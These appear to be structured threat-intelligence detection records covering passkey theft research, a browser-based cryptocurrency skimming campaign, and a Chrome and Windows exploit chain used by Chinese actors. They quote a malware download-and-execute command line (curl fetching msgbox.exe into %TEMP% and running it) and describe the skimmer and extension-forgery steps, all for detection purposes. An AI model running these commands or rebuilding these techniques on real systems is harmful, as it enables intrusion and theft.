who.versions_affected: Demonstrated against Google Password Manager in Chrome on Windows on devices with a Trusted Platform Module; the acceptance weakness it relies on is not specific to that combination

what.summary: Researchers described three attacks against synced passkeys, all of which assume malware is already running as the user and none of which needs privilege escalation. The first extracts the wrapped identity key from disk or memory and signs authentication requests through the platform cryptography interface, with no device unlock and no user interaction. The second invalidates the existing user-verification key during device re-onboarding and registers an attacker-controlled one, which moves authentication entirely into the attacker's environment and removes the need for continued access to the victim's device. The third forces re-registration to trigger the recovery flow, then reads the security domain secret out of browser process memory while it is briefly in plaintext; that secret decrypts every synced passkey private key. The underlying weaknesses named are trusting client-supplied device signals, relying parties validating the user-verification flag inconsistently, and key material being exposed during onboarding and recovery. No active exploitation was observed: this is disclosed research, and the exploits were reported to the vendor.

how.logic: All three attacks begin at the browser's own credential state, so the detection is the familiar one with new paths: the passkey enclave state and the sync database read, written or deleted by a process that is not the owning browser. Deletion matters as much as reading here, because removing the enclave state is what forces the recovery flow the third attack depends on.

markers.note: sync database lives under <Profile>\Sync Data\LevelDB

how.caveat: Backup and endpoint management software reads these paths; allow-list by signer, and exclude the browser's own processes or this is constant noise. The memory-read half needs an endpoint agent that reports cross-process reads, which is not universally collected.

how.logic: Two of the three attacks are re-onboarding attacks, so the enrolment signal is the one that catches them from the identity side rather than the host side. Device re-registration and authenticator reset for an account whose device has not changed, and repeated onboarding triggers for one account in a short window, which is the observable shape of forcing a recovery flow rather than waiting for one.
how.caveat: Genuine device replacement produces the same sequence, which is why the attack works. Unexpected recovery PIN prompts during otherwise routine authentication are the user-visible tell and are worth collecting as a report channel, because the user notices them before the logs make the case.

how.logic: The first attack signs without any user interaction or device unlock, so the assertion arrives carrying no genuine user verification. Where the relying party records the verification flag, an accepted authentication with the flag unset is the direct observation of the attack rather than an inference about it.
how.caveat: The research states this attack typically fails where the relying party strictly enforces user verification, so the finding is as much an audit of which relying parties enforce it as a detection. Enumerate that first; a relying party that never sets the flag will either never fire or always fire, and both readings are wrong.

where.title: Pass the Passkey: A Novel Attack Surface in Passwordless Authentication

notes: Disclosed research with no observed in-the-wild use at publication, which is why every block here assumes the stated precondition: malware already running as the user. That precondition is also the mitigation of first resort, and it is worth saying plainly to anyone treating passkeys as removing endpoint compromise from the threat model -- they move the credential, they do not remove the host. First record in this corpus covering passkeys or WebAuthn.

who.versions_affected: Not version-bound. The Visualization API is used as designed: a feature introduced in 2008 that gives free, unauthenticated, read-only access to any spreadsheet published to the web, through a query embedded in a URI.

what.summary: A financially motivated campaign used a fake leaked vulnerability report, hosted on the vendor's own document service and advertised through a Telegram channel, dark web forums and comments on text-sharing sites, to persuade individuals who frequent cryptocurrency trading, software development, basic cybersecurity and hacking forums to inject attacker JavaScript into their own browser session, either by pasting it into the Chrome navigation bar behind the javascript: scheme or by installing it into the Tampermonkey userscript extension. The lure claimed a non-existent API flaw at cryptocurrency swap services would pay out more on a trade, so its appeal was to people willing to exploit a flaw for gain. The loader then retrieved an obfuscated second stage from two cells of a publicly published spreadsheet through the Visualization API, so the command and control channel was an ordinary HTTPS request from the browser to the document service's real domain. The injected script behaved as a web skimmer against two cryptocurrency swap sites, replacing deposit addresses in the rendered page, in fetch responses and on the clipboard, and adding counterfeit bonus interface elements to explain the altered figures.

how.logic: A browser requests the Google Sheets Visualization API query endpoint, a path of the form /spreadsheets/d/<document identifier>/gviz/tq on docs.google.com. The API is unauthenticated and read-only over any spreadsheet published to the web, so the response is attacker-controlled content arriving from a domain with a valid certificate and a clean reputation. The discriminator the source supplies is the path rather than the destination: the query endpoint is a separate documented API over published sheets, so the requests worth triaging are the ones for it rather than for the interactive document paths.

markers.note: the service's own domain; this is the point of the technique and never an indicator on its own. Bound explicitly to the proxy-side target domain, because the default binding for a domain marker is the DNS question name and a name-only sensor cannot carry this detection.

the Visualization API query endpoint; the source gives the URI shape as /spreadsheets/d/<document identifier>/gviz/tq followed by the query, and gives tqx=out:json as its worked example of the query portion. That example is the API's documented form rather than an observed actor request, so it is recorded here and not made a test.

how.caveat: The document service is among the most contacted destinations in most estates and the Visualization API is a documented feature with legitimate users, including dashboards and pages that embed sheet data, so this cannot be alerted on by destination without breaking real work. Whether ordinary interactive use of the document service ever requests the query endpoint is not something the source states, so measure the baseline volume of that path in your own proxy data before deciding what this hunt costs. It needs full URI logging: a sensor recording only SNI or the domain cannot separate this from somebody opening a spreadsheet, which is why TLS metadata and DNS are not declared as evidence here even though both see the destination. The publisher's own recommendation is to monitor requests to the document service from unknown applications or from browser sessions carrying no other document service activity. The second half of that does not separate this campaign, and a rule built on it returns nothing: the publisher reports the lure document hosted on the same service throughout, and the first-stage script moved onto that service in July 2026, so on a victim host the lure fetch and the payload fetch are both to the same domain minutes apart. Whether the query request carries a referring origin that an interactive document page would not is the obvious second discriminator, and it has to be measured against the consumer's own proxy data rather than assumed, because the source does not describe it. The published document identifier is not a durable anchor either: the source records the actors changing which cells the query named, and changing the spreadsheet entirely after their first disruption.

how.logic: This is ClickFix with no operating system stage. The target is talked into pasting JavaScript into the browser rather than a command into a shell, so there is no interpreter process, no encoded command line, no parent chain and nothing written to disk; endpoint process telemetry records nothing, and that absence is a property of the technique rather than a gap in collection. What remains is web traffic: a browser retrieving a raw script body from a text-sharing or document service, then the same host retrieving the document service query API path, then activity on a trading site unrelated to either.

markers.note: The third leg observed was activity on SwapZone.io for the first lure version and on SimpleSwap.io for the second. Those are the targeted sites rather than attacker infrastructure, so they are recorded here as context and not made a test; the durable part is the two-retrieval sequence.

iocs.note: first-stage loader URL for the second lure version, reproduced defanged exactly as the source prints it. The bracket inside the fragment is verbatim from the source and is not a defang artefact. A fragment is never sent to the server, so this string in full cannot appear in proxy, web server or DNS data; the path entry below is the part that reaches a sensor.
the only part of that URL a proxy sees. One observed paste, with the shelf life of one.
the text-sharing service hosting the first-stage loader in both observed lure versions, abandoned by the actors in July 2026

how.caveat: The window between the two retrievals has to be set against the consumer's own estate and is deliberately left unresolved, because the source gives no timing. Developers legitimately fetch snippets from text-sharing services, so a text-sharing retrieval alone is noise in an engineering population. The observed first-stage host is out of the chain: the source records the text-sharing service's administrator adding automatic detection for the first-stage signature in July 2026, after which the actors moved the script into a document on the document service and removed that leg entirely. In that later form both legs are requests to the same document service domain, so a rule built on two different destinations does not see it, and a rule built on two different hostnames would have to be rewritten as one script-body retrieval followed by one query API retrieval. The indicators are kept because they are cheap to query, not because they still resolve; none of them belongs in the marker set, where a conjunction would gate the live sequence test behind a dead URL.

how.logic: The second version of the lure told the target to install the Tampermonkey userscript extension from the official browser store and paste the loader into it, and that is what gave the campaign persistence: the extension reassembles and injects the payload on every visit to the targeted site. Inventory browsers for userscript manager extensions and treat one on a host whose role does not require it as worth a question. This answers which hosts are able to run a pasted script; it does not answer which are running one.
how.caveat: The extension is legitimate and widely installed, and the store is not the trust boundary here: nothing malicious was published to it, so an approved-extension list and a force-install policy check both answer a different question and would return nothing for this campaign. The malicious part is the userscript the user pastes in afterwards, which appears in no extension inventory; reading the sites a userscript is registered against means reading the script bodies the extension holds rather than the extension record, which a standard inventory does not carry, so no marker here claims it. Where browsers are unmanaged there is no inventory to query at all, which is why the source frames this as a browser management control rather than a detection. On scoping: the source states the plugin activated the script when the user visited SimpleSwap.io, which was the second lure version. The first lure version targeted SwapZone.io by pasting into the Chrome navigation bar and involved no extension at all, so nothing said about what a userscript is registered against extends to that site.

how.logic: The payload is in-page JavaScript rather than a process. It registers a MutationObserver and rewrites displayed deposit addresses and transaction amounts as the page updates, overrides the browser fetch API so that JSON responses carrying wallet or deposit addresses are rewritten before the page sees them, and substitutes the value placed on the clipboard when the user copies an address, selecting from a rotating list of embedded Bech32 addresses. None of this leaves the browser, so the detection surface is the served application itself: review the JavaScript your own customer-facing site serves for code that reassigns the fetch API, registers a mutation observer over payment fields, names payment form element identifiers without belonging to a declared dependency, or decodes itself at runtime from arrays of encoded values.

markers.note: The publisher recovered these UI selectors from the de-obfuscated second stage: data-testid values recipientAddressContainer, depositAddress, currencyList, cryptoExchangeTab and mainExchangeForm. They belong to the two observed sites and are the shape of the test rather than a portable list, so they are recorded here and not made a test; on any other site the equivalent identifiers are that site's own.

how.caveat: The observed payload did all three of these, so a consumer that ANDs them describes that payload accurately. Treat them as alternatives anyway: the logic they come from is a list of alternative signs, a skimmer need only do one of them, and any one alone in your own bundle is worth a look. This is an inspection of your own application, not a detection over telemetry, and it only helps the site operator; the publisher's own recommendation is to test and sanitise third-party dependencies in customer-facing web applications regularly, checking for obfuscated script that appears out of place. The artefact being inspected is the application's own deployed JavaScript, which no evidence type in the vocabulary names; file_artefact is the closest fit, and web server and proxy logs have been removed from the declaration because both record requests rather than response bodies. The organisation whose user was defrauded sees nothing, because the substitution happens inside the browser after TLS termination and produces no process, no file write and no unusual destination. A signature written against a decoded sample will not survive the next revision: the source records a different XOR key and fresh random variable and function names on each revision, consistent with output from a public JavaScript obfuscator, while the underlying script was not changed after it was first written for each targeted site.

where.title: ClickFix moves into the browser: Cryptocurrency theft with Google-hosted C2

notes: The publisher named no actor and assigned no ATT&CK technique identifiers; every technique in this record is a mapping added here, not a claim the source made. Two lure versions are described and they must not be merged. The first was active 12 to 16 April 2026, targeted SwapZone.io, and was run by pasting a script from a text-sharing service into the Chrome navigation bar behind the javascript: scheme, with no extension involved; its loader searched the page for script elements associated with browser extensions and injected into one at random, falling back to a random script element, which is a different relationship to extensions from the second version's use of one as a host. The second was observed as a revision on 18 April, was active from at least 19 April and was still live on 22 July, targeted SimpleSwap.io, and used the Tampermonkey extension, which the source says activated the script when the user visited SimpleSwap.io. The Google documents were reported again and were still active on 11 August 2026. Dates are held at month precision in the when block, so the day-level lure windows are recorded here. Scale as published: 21 unique second-stage samples collected from the spreadsheet, 49 Bitcoin addresses identified in the campaign, of which an identical set of 30 appeared in the majority of samples de-obfuscated between April and the end of June 2026, and 24 received victim funds totalling 0.159 BTC, about 10,000 US dollars at early August 2026 valuations; the publisher states more was likely collected because it found no samples from before April. Funds were routed out through 30 further wallets and then through over 3,000 additional addresses, assessed as a mixing operation. The payload cells were concealed in the spreadsheet by formatting the text white on a white background and pushing the rows further down as revisions were added. The publisher separates several things from this campaign that must not be mined into it: prior state-sponsored abuse of Google services for command and control, Magecart web skimming, and the supply-chain access broker named TeamPCP are all cited as comparison or as forward-looking risk, not as part of what was observed here. The early email-borne versions of the lure are attributed to other researchers rather than to the publisher's own observation, so no email detection is drawn from them. Four encoding decisions are recorded so they are not re-derived wrongly. First, what.attack_surface is api_endpoint because the Visualization API is the surface the actors used; neither targeted trading site is described as compromised, the injection happened entirely in the victim's own browser, and watering_hole, which the vocabulary defines as a compromised site the target was expected to visit, would therefore be false. The vocabulary has no value for a surface the victim opens themselves after social engineering. Second, what.impact carries persistence only, which the source states for the extension leg. The outcome was theft of victims' Bitcoin by substituting deposit addresses, and the vocabulary has no impact value for fund theft or transaction redirection, so the figure sits in these notes instead. Nothing in the source describes a logging, alerting or security control being interfered with, so defence_evasion does not apply: the concealment here is the choice of a trusted destination, not interference with a control. Third, who2.target_sectors is cross_sector in its not-sector-specific sense; the source reports no sector targeting and states the campaign poses no specific threat to most organisations, selecting marks by forum population and by willingness to commit fraud. Fourth, on defender visibility: because neither site was compromised, the served-JavaScript inspection in the last how-block is a check a site operator runs on their own application and addresses reuse of the technique against a site that has been compromised, while the visibility a defender has over this campaign as observed is the proxy-side evidence in the first two how-blocks, which is what the publisher's own monitoring recommendation asks for.

who.versions_affected: Google Chrome releases that had not yet picked up the Chromium source fix for CVE-2026-85046. The exploit derives the V8 heap MAP_WORD constant at runtime through a memory leak rather than hardcoding it, which the publisher states gives it resilience across Chrome 151.x point releases. The kernel stage runs only where the process is not already elevated and the Windows build is within a target set stated as Windows 10 1809 through 22H2, Server 2022 and Windows 11 21H2, with all build versions above 22000 rejected.

what.summary: Two separate Chinese threat actors used the same multi-stage exploit chain against Chrome on Windows, with byte-for-byte identical shellcode, to run code on the hosts of targets who clicked a link in a spear-phishing email. A type confusion flaw in V8 gave arbitrary read and write inside the V8 sandbox, a WebAssembly defect escaped that sandbox, and a Windows kernel flaw in RtlpCreateServerAcl escalated privilege so the renderer could be escaped and code injected into the Chrome browser process, from which a chosen payload was downloaded and run. The Chrome flaw had already been fixed in the Chromium source but the fix had not reached a Chrome release, so a vulnerability that was an N-day upstream was a zero-day against Chrome users. One actor deployed a JScript backdoor through a sideloading and scheduled-task loader chain; the other installed a credential-stealing browser extension by stripping the browser's newer preference integrity authenticators so that forged legacy ones would be accepted.

how.logic: The last embedded payload in the chain runs only after the kernel escalation succeeds, opens the Chrome browser process and injects into it, then calls CreateProcessA from inside that process. The download and execution of the next stage therefore appear as a child of the browser itself. The publisher states that everything downstream of the injection is indistinguishable from ordinary Chrome child-process activity apart from the command line, which makes the command line the only discriminator available: a command interpreter started by the browser that fetches an executable into the temporary directory and runs it in the same line.

markers.note: the source names the Chrome browser process rather than an image name; this is the image name for it

the string was passed to CreateProcessA unexpanded, so the temporary-directory variable appears literally in the recorded command line; the expanded alternative is the standard expansion of that variable and is carried for sensors that record the resolved path, not as a literal from the source
the write and the run are a single command line

iocs.note: exploit hosting and staging for the first actor
hosts cloud.shinewrist.net, and served the same actor's staging payloads in March 2026
msgbox.exe, second actor's loader from its own infrastructure

how.caveat: The browser legitimately spawns its own child processes constantly and can start a command interpreter through an ordinary user action such as running a downloaded file, so the parent and child image names alone are not enough. The downloader verb and the write-then-run in one command line are what carry it. A sensor that records the expanded path rather than the string as passed will not match the temporary-directory variable, so both forms are carried in the command line tests. Only process telemetry is declared here: every test in this block reads a process record, and the network indicators below are for lookup rather than for the rule.

how.logic: The exploit page holds no reference to the payload it will deliver. In the first cluster the emailed link did not point at attacker infrastructure at all: it pointed at a legitimate third-party website, a US-based university, where a reflected cross-site scripting flaw redirected the visitor on to the landing page on threat-actor infrastructure, and that redirect is the first network artefact in the chain. An obfuscated loader script, fetched from the landing page, assembles the request at runtime from an unobfuscated configuration variable and appends the payload location as a query parameter, then injects that URL as the source of a hidden frame appended to the landing page while the victim continues to see a decoy image. A second parameter arms the page, and without it the page does nothing, which is how the operator tested safely. In proxy or web logs the signal is one request whose query string carries both the arming parameter and a parameter whose value is an absolute URL ending in an executable, fetched into a frame with no corresponding user navigation. The stage before it filters on the user agent and continues only for Chrome on Windows, so a request for the loader script that is never followed by a request for the exploit page is what everything else sees.

markers.note: the arming parameter; the page defaults to a probe mode that throws
the payload location passed in from the loader

iocs.note: page.html exploit delivery page, shared by both actors

how.caveat: The parameter names belong to this operation and will change; the durable half is the shape, a landing page whose query string carries an absolute URL to an executable. The publisher describes the third-party redirect for the first cluster only, and gives the second cluster's emailed links as pointing at the actor's own hosts with no redirect described, so neither an inbound-link reputation check nor a redirect check covers both. None of it is visible where the proxy does not decrypt, and the exploit page was loaded in a hidden frame, so a detection keyed on top-level navigation will miss it entirely. The exploit code itself is held in script blocks the browser parses as data and is then run in a dedicated worker thread, so a failed attempt crashes neither the visible tab nor anything a user would report. The file names this operation used are not carried as path literals: every URL the publisher prints has its containing directory segment redacted, so the observed paths were never the root-relative ones the names suggest, and a path equality test could not have matched the traffic or coexisted with the query-string tests above.

how.logic: The loader builds its own download URL from the device hostname and requests a file named for that host, which lets the operator provision a payload per victim and return not-found to everybody else. The publisher states the server returned 404 for hostnames it had not provisioned, and that running the loader for long enough eventually produced a payload. The detection does not need the path, only the relationship: an outbound request whose URL contains the requesting device's own hostname, to a destination the estate has no other relationship with. The same actor used the same scheme in March 2026 with both the hostname and the user name in the path, so the relationship rather than the file name is the part that generalises.
how.caveat: Management, inventory and telemetry agents put the device hostname in a URL routinely, so this cannot alert without an allow list of destinations first; the discriminator that survives is the destination, a host-named path on a domain nothing else in the estate talks to. The publisher reports not-found responses for hostnames it had not provisioned, and that running the loader long enough eventually produced a payload; both the misses and the eventual delivery are wanted, so the response status is not carried as a filter condition, and scanning and broken links produce the same not-found responses in any case. The publisher also notes the loader was recompiled a day after the first wave while the URL, the download mechanism and the task name stayed the same, so the file hashes date faster than the behaviour.

how.logic: The downloaded loader exists only to extract two files from its own resources, a legitimate Windows executable and a malicious library, and the legitimate executable is then run so that it loads the library beside it. The pairing is the signal rather than either file alone: a binary written by a process that was itself a child of the browser, executed shortly afterwards, and loading a library from the same freshly written location.
how.caveat: The dropper was recompiled the day after the phishing wave with a new version of the library and served from the same URL with the dropper code and the legitimate executable unchanged, so a hash of either file dates within days. The publisher does not name the legitimate executable that performs the load or the directory the pair is written to, so the rule has to be built on the library name and the write-then-load relationship rather than on the host binary. Only the library name sits in the filter: the dropper and the library it carries are properties of different events, so a single condition testing for both names can never be true, and the dropper is carried as an indicator instead.

how.logic: The loader keeps itself alive with a scheduled task named to read like a platform component, which re-runs the sideloading chain every five minutes. Ordinary persistence tasks run at logon, at start-up or once a day; a repetition interval measured in minutes is a watchdog, and the interval rather than the name is what generalises. The updated version of the loader changed the task action from re-running the installer against a cached file to re-executing the whole chain, and added a check for an existing task before creating one, so on a re-infected host a single creation event may be all there is to see.

markers.note: bound to the command line of the task-creation event, which is where the name is observable in process telemetry; without a binding this marker is dropped and the block ships with no literal at all

how.caveat: The task name belongs to this campaign and is chosen to read like a platform component, so name matching alone dates immediately. Software updaters and monitoring agents do register short-interval tasks, which is why the action the task runs matters as much as the interval; a task that re-launches a binary written into a user or temporary directory in the last hour is the finding, not the interval on its own. Five minutes is what this loader set and it is stated in the logic above, but no interval bound is carried as a marker here: an equality on the measured value excludes every neighbouring interval, and the interval that is anomalous is a property of the estate's own task inventory, which is the test the pattern carries.

how.logic: The payload retrieved by the per-host beacon is written into the temporary directory under a text-file name and run with the platform installer, which executes obfuscated JScript held in the package's custom actions. The backdoor then lives entirely inside the installer process as an evaluated string: it opens an HTTP client and loops, posting the victim's domain, user name and the previous iteration's command output as a tab-delimited body, and evaluating each response as further JScript. Nothing ever starts a script interpreter, so a control keyed on the script host sees nothing. What remains is the installer process being pointed at a file whose extension is not that of an installer package, and that same process making repeated outbound POST requests.

iocs.note: the backdoor script returned by the server

how.caveat: Software deployment runs the installer constantly and legitimately, so the image name is not the signal; the argument extension and outbound POST traffic from the installer process are. The staged file name is carried as an indicator rather than as a marker, because a file name is not a property of the process event the other markers select and the command line test already requires the extension. The command output travels in the request rather than the response, which inverts the direction a data-loss control usually watches, and the body is tab-delimited plain text over HTTPS so it is only readable where the proxy decrypts. The backdoor has no persistence of its own: it survives only because the scheduled task keeps restarting the chain that fetches it. The reused pattern's own command line marker expects a remote address or a script scheme in the arguments; this variant passes a local file path and matches none of those, so anchor on the markers here rather than on the pattern's.

how.logic: The extension loader does not defeat the browser's newer preference integrity scheme, it removes it. It copies the secure preferences file, deletes the per-preference encrypted hash entries and the whole-file encrypted hash, adds its extension with the settings it needs, regenerates the legacy message authentication codes and the legacy whole-file value, and writes the file back. The durable observable is that write: the browser's secure preferences file replaced by a process that is not the browser that owns it.

markers.note: the browser's standard profile location, used here to scope an otherwise ambiguous file name; the source gives the file name only

how.caveat: Backup, profile-migration and endpoint management tooling writes this file legitimately, so allow-list by signer rather than by path. The publisher states that the legacy fallback the technique relies on is enabled by default in the browser's releases as of 8 September 2026 and is disabled only by compiling the browser from source, so this is not a setting a defender can close. It also notes the technique was added to a widely used public repository for silently installing extensions on 6 August 2026, weeks before these campaigns, so it should be expected beyond these two actors. This block tests the write event only; the state the write leaves behind is a separate reading, because a file-content property is not present on a write record.

how.logic: On the next start the browser finds no encrypted authenticators, accepts the forged legacy ones because that fallback is still permitted, treats the profile as needing migration, and generates fresh encrypted hashes over the tampered state, so the newer scheme ends up authenticating the attacker's extension. Between the loader's write and that next start the profile carries the legacy authenticators while the encrypted ones are absent, and that absence is the fingerprint of the downgrade rather than of the tool that performed it. It is read from the file at rest across the estate rather than from an event.
how.caveat: This is a race rather than a control, and it is kept at hunt for that reason. The window closes at the profile's next browser start, after which the migrated state is indistinguishable from an untampered one by the publisher's own account, and the extension cannot do anything until that start happens, so a sweep finds only the hosts caught before it. A profile with no encrypted authenticators is also what a genuinely old profile looks like before it has migrated, which is why the reading is taken across the population rather than from one file: one profile missing them where the rest of the estate carries them is the finding.

how.logic: The final payload for the second actor is a browser extension with a fixed identifier that masquerades as the vendor's own assistant extension. It records every keystroke, input field value and pasted clipboard text across all tabs with no suppression of sensitive fields, takes all cookies through the extension interface along with local and session storage tokens, watches page content for keywords the operator supplies and screenshots the page when one matches, and sends the collection to its server at roughly thirty second intervals, with that sending enabled on first run. Because an extension reads pages after decryption and after authentication, nothing on the network shows what it took, so the control is an inventory of installed extension identifiers against an approved list.

markers.note: the spelling the reused pattern uses, so the consumer resolves one computation and not two

how.caveat: This is a finding only against an approved list that is actually maintained; in an estate without one it produces a review list rather than an alert, which is why it is kept at hunt. The extension carries no command to run code on the host, which the publisher assesses with low confidence was because the theft capability was already sufficient, so nothing will ever spawn a process and a detection waiting for execution telemetry will not fire. Its traffic is browser traffic to a web destination and looks like browsing. It does accept a command to make arbitrary cross-origin requests from the victim's browser context, so the browser can be used to reach places the operator cannot. The reused pattern's registry markers describe policy-based installation; this actor installed the extension by editing the profile's preference file instead, so those markers do not cover this variant.

how.logic: Where no extension inventory is available, the identifier this campaign used can be matched directly. The publisher gives a fixed identifier for the extension, and a browser unpacks an extension into a directory named for its identifier, so the identifier appears in a filesystem path under the profile.

markers.note: the extension identifier as published by the source; matching it against a path relies on the browser unpacking an extension into a directory named for its identifier, which the source does not itself state

iocs.note: second actor, phishing and command and control

how.caveat: The identifier is the only durable literal here and it changes with a rebuild, so this dates quickly and the inventory against an approved list is the real control. The publisher gives the extension's outbound cadence as roughly thirty second intervals while it is collecting; that is approximate and jittered and is deliberately not carried as a marker, because an equality on a jittered cadence matches nothing and any fixed band would be a bound invented here rather than measured against the estate's own browser egress. It is a corroborating signal for an analyst, not a filter condition.

how.logic: Both domains the second actor used resolve through a provider tunnel: the publisher gives a lookup for one of them whose answer carries a canonical name under the tunnel provider's own routing domain. The observable sits in the answer rather than the query, which is why a control reading only the question name sees nothing: what identifies it is a canonical name under the tunnel provider's domain, returned for a domain the estate has no relationship with.

markers.note: appears in the canonical name of the answer, not in the query, so it is bound to the answer field explicitly; the default binding for this marker type is the question name, where this value can never appear

how.caveat: The tunnel service is a legitimate product with a great many legitimate users, and an estate that runs it will see its own hostnames here, so this needs an allow list of the tunnels the estate operates before it carries any weight. It also needs resolver telemetry that records the answer chain and not only the question name; where only the question is logged there is nothing to match. The publisher's evidence is one lookup it ran and printed, for a subdomain of one of these two domains, rather than a reading taken from victim telemetry. The publisher reports this for the second actor's domains only; the first actor's exploit host is given in the report as a plain address indicator instead, so this is not a marker of the campaign as a whole. The reused pattern's own namespace markers enumerate provider-issued ephemeral hostname domains and do not carry this tunnel routing domain, so the literal here is the record's rather than the pattern's.

where.title: Mind the (Patch) Gap: Multiple Chinese Threat Actors Chain 0-day Exploits in Chrome & Windows

notes: The organising lesson is the patch gap rather than any one flaw. The browser vulnerability was reported to the upstream project on 4 August 2026 and fixed in the open-source code, but the fix had not reached a browser release when the phishing was sent, so an N-day at source level was a zero-day in practice and the fixed source was available to be read. The publisher assesses with medium confidence that the exploit developer reverse-engineered the source fixes, and with high confidence that this class of gap is a growing risk as models make vulnerability research and exploit development faster. Both actors ran the same exploit components with byte-for-byte identical shellcode from their own infrastructure and diverged only at the payload, which the publisher assesses with low confidence points to the chain having been sold or otherwise provided to different end-users in China, and with medium confidence that the short window forced them to reuse it unmodified. Attribution confidence here is the publisher's stated high confidence that the first cluster is the same actor as its March 2026 campaigns, resting on a shared phishing sender, shared hosting and an analogous per-host staging scheme; the second cluster's domains are linked to JungleBamboo on a domain registration pattern the publisher describes as consistent with that group's known registration patterns, for which no confidence level is stated. The publisher describes both as Chinese threat actors deploying espionage tooling but does not use the words state-sponsored, so the actor type here is a classification rather than a quotation. Timing worth keeping: the exploit page carries build strings dated 27 to 29 August 2026 and the first loader was compiled on 31 August, one day before the phishing. Three things are deliberately unset rather than filled in. No end date: the publisher states no cessation, and 2 September 2026 is only the last dated event it reports, being the second cluster's second phishing wave and the first cluster's recompiled loader components. No target sector: the only sector the publisher names is non-governmental organisations, for the first cluster, and the vocabulary has no value for it, so the field is left out rather than widened into a cross-sector claim the source does not make; the second cluster's targets are described only as a different set, with no sector given. The region is the United States on the strength of the publisher's statement that the first cluster targeted US-based organisations; the other United States reference in the report is the university website abused to redirect, which is infrastructure rather than a target, and the second cluster's target region is not stated.

who.versions_affected: Latest stable releases of Chrome and Chromium-based browsers available to the public at the time of the activity. The publisher states the fix for CVE-2026-85046 was committed to upstream Chromium on 7 August 2026 but did not reach the general stable Chromium build until 3 September 2026. No affected version numbers are given.

what.summary: Four espionage-motivated actors used a shared exploit kit that chained two Chrome V8 flaws with a Windows kernel privilege escalation to run an operator-chosen command outside the browser sandbox on hosts reached by spearphishing links.

how.logic: A browser process is the parent of a command shell or of curl, and that child fetches an executable into a user-writable directory and runs it. In the default kit configuration the ancestry is chrome.exe launching cmd.exe, which launches curl.exe to download msgbox.exe into the per-user temporary directory and execute it. The browser broker process is the parent rather than the renderer because the final injector stage writes a CreateProcess stub into the parent broker process and starts a remote thread there, so the child appears under the browser itself.

markers.note: the publisher gives chrome.exe -> cmd.exe -> curl.exe -> msgbox.exe as the default process tree and names no other browser executable anywhere in the report. The shared pattern carries the Chromium-family image list for an estate running Edge, Brave or Vivaldi.

the kit default is curl -sS -o "%TEMP%\\msgbox.exe" <exeUrl> && "%TEMP%\\msgbox.exe"; the UNK_DoubleCheck variant ran cmd.exe /c curl.exe -k -o "%APPDATA%\\Microsoft\\Windows\\#1" instead. The destination alternates, so the two forms cannot both hold on one command line and must not be tested as separate conjuncts.

msgbox.exe is the kit default, used when the exeUrl configuration variable is unset; ChromeUpdate.exe is the name used in the TA412 campaign. The publisher's hunting list names both as dropped to the temporary directory.

markers.expr: process ancestry chrome.exe -> cmd.exe -> curl.exe -> downloaded_executable observed on one host within a short window

iocs.note: alternative name named in the publisher's hunting guidance

how.caveat: Chromium browsers spawn a command shell rarely but not never, and curl.exe ships with modern Windows, so neither image name carries the detection on its own. The browser as the ancestor of a download-and-execute pair is the discriminator. Two of the four campaigns departed from the default: one wrote to a different directory under a different filename, and one modified the injector stage to download and execute a sideloading pair directly. The publisher does not say what command line, if any, that modified injector runs, so whether the process-tree rule fires on it is unknown. A rule anchored only on msgbox.exe in the temporary directory covers the default configuration and not those variants.

how.logic: The exploit kit JavaScript carries a stable set of identifier strings across every packaging variant the publisher observed, including variants that stripped comments, bundled the kit into one file, or encoded its components. The publisher's own signature declares sixty-five strings and fires on any three of them, carrying a base64 variant of nearly every string alongside its plaintext form.

markers.expr: count of distinct exploit-kit constants present in a served script body, over the set [CVE_EXP_CORE, CVE_EXP_NO_D8_DRIVER, CVE_PROFILE, PAYLOADS_B64, v8ctf_exp_attempt, MAP_WORD, FDA_MAP, cageRead, cageWrite, kExprThrowRef, confuseCall, WIN64_PROLOGUE, WIN64_EPILOGUE, HOSTL_IDX, DONOR_IDX]
markers.note: a stricter subset of the publisher's rule, which fires on any three of sixty-five declared strings including hex sentinels, prologue and epilogue byte sequences, shellcode byte markers and a base64 variant of nearly every string. This marker carries the fifteen identifier strings in plaintext form only, so a packaging variant that base64-encodes the script body is outside it.

exploit kit JavaScript across all four campaigns. The publisher names five of the six files, driver-html.js, Index.js, Loader.js, Indostartupexpo.js and font-01.js, and labels the sixth only as BlueMoon exploit JavaScript, so the names do not map one to one onto the hashes here.

how.caveat: The string set is the publisher's, and the kit was already being repackaged when the report was written, so an encoder that renames these identifiers defeats the content match while leaving the process-tree detection intact. In the other direction, several of the constants are V8 internals and one is the name of Google's own public V8 bug bounty challenge, so V8 exploitation research and challenge submissions carry three or more of them; scope the rule to script bodies served to ordinary user populations rather than to research or engineering browsing.

how.logic: The exploit kit writes a retry counter into the browser profile's session storage under a fixed key name, which the publisher names as a hunting artefact. It is a disk artefact inside the browser profile rather than an event, so it is answered by sweeping hosts and not by a streaming rule.

markers.expr: session storage key named v8ctf_exp_attempt present in a Chromium browser profile session storage store
markers.note: the kit's retry counter, named by the publisher in its hunting guidance

how.caveat: No streaming rule answers this; it needs a file-level sweep of browser profile directories. The publisher does not say at what point in the chain the key is written, nor how long it survives in a profile, so neither its presence nor its absence settles how far the chain got on that host. The same key name is also one of the strings in the publisher's content signature.

how.logic: A process that is not the browser writes the Chromium Secure Preferences file, having first terminated the browser because Chromium holds that file open while running, and then relaunches the browser with a session-restore switch so the user's tabs reappear. The installer observed here enumerated Google Chrome, Microsoft Edge, Brave and Vivaldi, and used the same inputs the browser uses to compute a valid checksum for the forged extension entry and then recomputed the master checksum, so the browser accepts the extension and raises no externally-installed warning. The browser's own integrity check is therefore not a detection source for this.

markers.expr: writer of the Secure Preferences file is not the owning browser executable and is not the managed extension deployment agent

markers.note: the installer relaunches each terminated browser with this switch to hide the restart

markers.expr: the terminated and relaunched process is the browser executable of one of Google Chrome, Microsoft Edge, Brave or Vivaldi
markers.note: the publisher names these four browsers as the ones the installer enumerated and terminated, and does not give their executable filenames; the consumer resolves the image names for its own estate

directory the extension archive was extracted to in the TA412 campaign; matched as a path prefix because the file events carry the files written beneath it, not the directory itself. This is a separate file event earlier in the same chain, not a property of the Secure Preferences write, so it must not be conjoined with the preferences path test.

how.caveat: Managed extension deployment through enterprise policy writes these files legitimately, and browser updaters restart browsers, so the writing process and the relaunch switch together are what make this usable rather than the file path alone. The forgery technique is publicly documented and predates this activity, so a match indicates the technique and not necessarily this exploit kit or this actor.

